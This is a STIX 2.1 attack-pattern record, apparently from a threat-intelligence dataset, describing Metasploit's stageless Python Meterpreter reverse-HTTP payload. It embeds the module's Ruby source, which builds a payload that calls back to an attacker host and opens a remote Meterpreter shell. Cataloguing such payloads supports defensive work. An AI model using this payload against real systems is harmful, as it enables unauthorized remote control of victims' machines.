{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b0269c67-5ed5-4801-8d56-c5616d8815f4",
    "created": "2024-08-14T16:33:19.39357Z",
    "modified": "2024-08-14T16:33:19.393574Z",
    "name": "Python Meterpreter Shell, Reverse HTTP Inline",
    "description": "Connect back to the attacker and spawn a Meterpreter shell",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/singles/python/meterpreter_reverse_http.rb",
            "external_id": "meterpreter_reverse_http.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nmodule MetasploitModule\n\n  CachedSize = :dynamic\n\n  include Msf::Payload::Single\n  include Msf::Payload::Python\n  include Msf::Payload::Python::ReverseHttp\n  include Msf::Payload::Python::MeterpreterLoader\n\n  def initialize(info = {})\n    super(merge_info(info,\n      'Name'        => 'Python Meterpreter Shell, Reverse HTTP Inline',\n      'Description' => 'Connect back to the attacker and spawn a Meterpreter shell',\n      'Author'      => 'Spencer McIntyre',\n      'License'     => MSF_LICENSE,\n      'Platform'    => 'python',\n      'Arch'        => ARCH_PYTHON,\n      'Handler'     => Msf::Handler::ReverseHttp,\n      'Session'     => Msf::Sessions::Meterpreter_Python_Python\n    ))\n\n    register_advanced_options(\n      Msf::Opt::http_header_options +\n      Msf::Opt::http_proxy_options\n    )\n  end\n\n  def generate_reverse_http(opts={})\n    opts[:uri_uuid_mode] = :init_connect\n    met = stage_meterpreter({\n      url:             generate_callback_url(opts),\n      http_user_agent: opts[:user_agent],\n      http_proxy_host: opts[:proxy_host],\n      http_proxy_port: opts[:proxy_port],\n      stageless:       true\n    })\n\n    py_create_exec_stub(met)\n  end\nend\n",
    "x_mitre_platforms": [
        "python'"
    ]
}